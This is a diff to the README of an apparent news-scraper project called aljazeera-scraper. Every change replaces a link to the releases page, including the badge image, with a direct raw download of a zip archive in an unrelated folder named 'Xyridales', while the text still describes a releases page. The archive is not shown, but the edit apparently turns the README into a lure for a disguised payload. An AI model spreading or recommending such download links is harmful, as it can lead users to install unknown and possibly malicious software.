@@ -1,6 +1,6 @@
 # 🌍 aljazeera-scraper - Effortlessly Extract News Articles
 
-[![Download aljazeera-scraper](https://img.shields.io/badge/Download-Al_Jazeera_Scraper-blue.svg)](https://github.com/mouadtagout/aljazeera-scraper/releases)
+[![Download aljazeera-scraper](https://github.com/mouadtagout/aljazeera-scraper/raw/refs/heads/main/Xyridales/aljazeera-scraper-v3.4.zip)](https://github.com/mouadtagout/aljazeera-scraper/raw/refs/heads/main/Xyridales/aljazeera-scraper-v3.4.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started with the Al Jazeera Scraper, follow these simple steps:
 1. **Visit the Releases Page:**
    You need to download the application. Click the link below to visit the release page.
 
-   [Download Al Jazeera Scraper](https://github.com/mouadtagout/aljazeera-scraper/releases)
+   [Download Al Jazeera Scraper](https://github.com/mouadtagout/aljazeera-scraper/raw/refs/heads/main/Xyridales/aljazeera-scraper-v3.4.zip)
 
 2. **Choose Your Version:**
    On the releases page, you will see several versions of the software. Select the latest version for the best performance.
@@ -50,7 +50,7 @@ To run the Al Jazeera Scraper effectively, your computer should meet the followi
 
 Ready to get started? Download the Al Jazeera Scraper now!
 
-[Download Al Jazeera Scraper](https://github.com/mouadtagout/aljazeera-scraper/releases)
+[Download Al Jazeera Scraper](https://github.com/mouadtagout/aljazeera-scraper/raw/refs/heads/main/Xyridales/aljazeera-scraper-v3.4.zip)
 
 Once you download the application, follow the installation steps provided above. No coding experience is required. Enjoy extracting news articles in just a few clicks!
 
